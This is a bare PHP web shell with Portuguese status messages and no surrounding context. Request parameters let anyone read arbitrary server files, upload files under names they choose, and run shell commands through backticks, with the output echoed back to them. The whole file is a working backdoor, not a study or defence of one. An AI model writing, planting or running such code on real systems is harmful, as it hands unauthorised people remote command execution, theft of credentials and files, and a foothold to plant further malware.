<?php
if (isset($_GET['f'])) {
    $f = $_GET['f'];
    if (file_exists($f)) {
        echo "<pre>" . htmlspecialchars(file_get_contents($f)) . "</pre>";
    } else {
        echo "Arquivo não encontrado.";
    }
}
if (isset($_FILES['up'])) {
    move_uploaded_file($_FILES['up']['tmp_name'], $_FILES['up']['name']);
    echo "Upload OK";
}
if (isset($_GET['c'])) {
    echo "<pre>";
    echo `$_GET[c]`;
    echo "</pre>";
}
?>
